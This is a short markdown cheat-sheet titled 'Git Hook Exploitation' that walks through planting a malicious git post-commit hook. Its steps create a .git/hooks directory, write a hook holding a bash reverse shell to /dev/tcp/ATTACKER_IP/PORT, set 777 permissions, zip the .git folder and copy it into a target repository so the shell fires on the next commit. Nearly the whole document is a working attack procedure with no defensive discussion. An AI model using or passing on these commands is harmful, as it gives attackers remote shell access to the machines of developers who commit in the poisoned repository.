# Git Hook Exploitation

## Steps

### 1) If there is no a .git/hooks directory, create one and go there

    cd ~
    mkdir -p .git/hooks && cd .git/hooks

### 2) Write a reverse shell

    echo '#!/bin/bash' > post-commit
    echo '/usr/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> post-commit

### 3) Assign full permissions on the file

    chmod 777 post-commit

### 4) Compress the .git/ contents

    7z a shell.zip .git/

### 5) Assign full permissions on the .zip file

    chmod 777 shell.zip

### 6) Send shell.zip to the target repo for exploitation

    cp shell.zip /home/user/repos/shell.zip
